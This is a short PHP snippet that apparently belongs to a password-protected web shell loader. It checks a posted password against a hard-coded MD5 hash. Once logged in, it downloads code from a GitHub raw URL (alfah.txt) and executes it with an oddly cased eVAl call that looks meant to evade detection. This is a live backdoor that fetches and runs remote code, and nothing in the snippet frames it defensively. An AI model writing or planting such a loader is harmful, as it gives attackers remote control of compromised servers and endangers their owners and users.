...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/BjourkaTutorial/alfah/master/alfah.txt');
    eVAl('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '9c983d1fc5500dce0b8f78e698372b8a'; // Replace this with your MD5 hashed password
